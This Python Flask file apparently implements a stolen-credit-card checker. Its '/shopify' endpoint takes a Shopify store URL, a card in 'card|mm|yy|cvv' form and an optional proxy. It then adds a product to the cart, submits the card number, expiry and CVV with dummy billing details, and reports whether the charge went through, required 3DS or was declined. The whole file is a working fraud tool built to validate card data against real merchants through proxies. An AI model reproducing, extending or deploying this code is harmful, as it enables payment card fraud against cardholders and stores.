from flask import Flask, request, jsonify
import requests
import json
import logging
import re
import random
import time
from datetime import datetime

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# =============== HELPERS ===============
def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    match = re.search(pattern, text)
    if match:
        card, month, year, cvv = match.groups()
        if len(year) == 2:
            year = '20' + year
        return card, month, year, cvv
    return None, None, None, None

def get_proxy_dict(proxy_str):
    """Convert proxy string to requests proxy dict."""
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, password = parts
        return {
            'http': f'http://{user}:{password}@{ip}:{port}',
            'https': f'https://{user}:{password}@{ip}:{port}'
        }
    elif len(parts) == 2:
        ip, port = parts
        return {
            'http': f'http://{ip}:{port}',
            'https': f'https://{ip}:{port}'
        }
    return None

def get_random_product_id(site):
    """Try to fetch a product ID from the site's collection."""
    try:
        url = f"{site}/products.json?limit=1"
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('products'):
                return data['products'][0]['id']
    except:
        pass
    return None

def get_cart_token(site, session, proxy_dict):
    """Get cart token from Shopify (required for checkout)."""
    try:
        url = f"{site}/cart.js"
        resp = session.get(url, proxies=proxy_dict, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            return data.get('token')
    except:
        pass
    return None

def add_to_cart(site, session, product_id, quantity=1, proxy_dict=None):
    """Add a product to cart using product ID."""
    try:
        url = f"{site}/cart/add.js"
        payload = {
            'id': product_id,
            'quantity': quantity
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        resp = session.post(url, data=payload, headers=headers, proxies=proxy_dict, timeout=15)
        return resp.status_code == 200
    except:
        return False

def get_checkout_url(site, session, proxy_dict):
    """Get the checkout URL from the cart."""
    try:
        url = f"{site}/cart.js"
        resp = session.get(url, proxies=proxy_dict, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('items'):
                return f"{site}/checkout"
    except:
        pass
    return None

def process_checkout(site, session, card, month, year, cvv, proxy_dict):
    """
    Attempt to process checkout with the given card.
    Returns dict with Response, Price, Gateway.
    """
    # Step 1: Get checkout page to obtain authenticity token and other hidden fields
    checkout_url = f"{site}/checkout"
    try:
        resp = session.get(checkout_url, proxies=proxy_dict, timeout=20)
        if resp.status_code != 200:
            return {
                "Response": f"Checkout page not accessible (HTTP {resp.status_code})",
                "Price": 0,
                "Gateway": "Shopify Payments"
            }
        html = resp.text
        # Extract authenticity token (commonly 'authenticity_token' in Shopify)
        token_match = re.search(r'name="authenticity_token" value="([^"]+)"', html)
        authenticity_token = token_match.group(1) if token_match else None
        # Extract checkout token from URL (often after /checkout/)
        checkout_token = checkout_url.split('/')[-1]
        if not checkout_token or checkout_token == 'checkout':
            # sometimes the token is in the URL after checkout/
            checkout_token = re.search(r'/checkout/([a-zA-Z0-9]+)', resp.url)
            if checkout_token:
                checkout_token = checkout_token.group(1)
            else:
                checkout_token = None
    except Exception as e:
        return {
            "Response": f"Failed to get checkout page: {str(e)}",
            "Price": 0,
            "Gateway": "Shopify Payments"
        }

    # Step 2: Submit payment
    if checkout_token:
        payment_url = f"{site}/checkout/{checkout_token}/payment"
    else:
        payment_url = f"{site}/checkout/payment"

    # Build payment payload (simplified)
    payload = {
        'authenticity_token': authenticity_token,
        'checkout[credit_card][number]': card,
        'checkout[credit_card][month]': month,
        'checkout[credit_card][year]': year,
        'checkout[credit_card][verification_value]': cvv,
        'checkout[payment_gateway]': 'shopify_payments',
        'checkout[accepts_terms]': '1',
        # Add other required fields (shipping, billing, etc.)
        # We'll use dummy data if not provided
        'checkout[shipping_address][first_name]': 'John',
        'checkout[shipping_address][last_name]': 'Doe',
        'checkout[shipping_address][address1]': '123 Main St',
        'checkout[shipping_address][city]': 'New York',
        'checkout[shipping_address][province]': 'NY',
        'checkout[shipping_address][zip]': '10001',
        'checkout[shipping_address][country]': 'US',
        'checkout[shipping_address][phone]': '1234567890',
        'checkout[email]': 'test@example.com',
    }

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Referer': f"{site}/checkout"
    }

    try:
        resp = session.post(payment_url, data=payload, headers=headers, proxies=proxy_dict, timeout=30)
        if resp.status_code == 200:
            # Check response for success or error messages
            if 'order placed' in resp.text.lower() or 'thank you' in resp.text.lower():
                # Try to extract price
                price_match = re.search(r'total_price["\']?\s*[:=]\s*["\']?([\d.]+)', resp.text)
                price = float(price_match.group(1)) if price_match else 0.0
                return {
                    "Response": "Order placed successfully",
                    "Price": price,
                    "Gateway": "Shopify Payments"
                }
            elif '3ds' in resp.text.lower() or '3d secure' in resp.text.lower():
                return {
                    "Response": "3DS_REQUIRED",
                    "Price": 0,
                    "Gateway": "Shopify Payments"
                }
            else:
                # Try to extract error message
                error_match = re.search(r'<p class="error">(.*?)</p>', resp.text, re.DOTALL)
                if error_match:
                    error_msg = error_match.group(1).strip()
                    return {
                        "Response": error_msg,
                        "Price": 0,
                        "Gateway": "Shopify Payments"
                    }
                # If no specific error, return generic
                return {
                    "Response": "Payment failed – unknown error",
                    "Price": 0,
                    "Gateway": "Shopify Payments"
                }
        else:
            return {
                "Response": f"Payment submission failed (HTTP {resp.status_code})",
                "Price": 0,
                "Gateway": "Shopify Payments"
            }
    except Exception as e:
        return {
            "Response": f"Checkout error: {str(e)}",
            "Price": 0,
            "Gateway": "Shopify Payments"
        }

# =============== CORE CHECKOUT FUNCTION ===============
def checkout_shopify(site, card, month, year, cvv, proxy=None):
    """
    Full Shopify checkout flow:
    1. Get a product ID (or use default)
    2. Add to cart
    3. Get checkout URL
    4. Process payment
    """
    session = requests.Session()
    proxy_dict = get_proxy_dict(proxy) if proxy else None

    # Step 1: Get product ID
    product_id = get_random_product_id(site)
    if not product_id:
        # If can't fetch, try a common product ID (some stores use 1)
        product_id = 1
        # Attempt to get from collection
        try:
            url = f"{site}/products.json?limit=1"
            resp = requests.get(url, proxies=proxy_dict, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('products'):
                    product_id = data['products'][0]['id']
        except:
            pass

    # Step 2: Add to cart
    if not add_to_cart(site, session, product_id, quantity=1, proxy_dict=proxy_dict):
        return {
            "Response": "Failed to add product to cart",
            "Price": 0,
            "Gateway": "Shopify Payments"
        }

    # Step 3: Get checkout URL
    checkout_url = get_checkout_url(site, session, proxy_dict)
    if not checkout_url:
        return {
            "Response": "Could not get checkout URL",
            "Price": 0,
            "Gateway": "Shopify Payments"
        }

    # Step 4: Process checkout
    result = process_checkout(site, session, card, month, year, cvv, proxy_dict)
    return result

# =============== API ENDPOINT ===============
@app.route('/shopify', methods=['GET'])
def shopify_check():
    site = request.args.get('site')
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')

    if not site or not cc:
        return jsonify({
            "Response": "Missing site or cc parameters",
            "Price": 0,
            "Gateway": "Shopify Payments"
        }), 400

    card, month, year, cvv = extract_cc(cc)
    if not card:
        return jsonify({
            "Response": "Invalid card format. Use: card|mm|yy|cvv",
            "Price": 0,
            "Gateway": "Shopify Payments"
        }), 400

    if not site.startswith('http'):
        site = 'https://' + site

    try:
        result = checkout_shopify(site, card, month, year, cvv, proxy)
        # Ensure result has required keys
        result.setdefault('Response', 'Unknown')
        result.setdefault('Price', 0.0)
        result.setdefault('Gateway', 'Shopify Payments')
        return jsonify(result)
    except Exception as e:
        app.logger.error(f"Checkout error: {e}")
        return jsonify({
            "Response": f"ERROR: Internal server error – {str(e)}",
            "Price": 0,
            "Gateway": "Shopify Payments"
        }), 500

# =============== HEALTH CHECK ===============
@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({"status": "alive", "time": datetime.now().isoformat()})

# =============== RUN THE SERVER ===============
if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
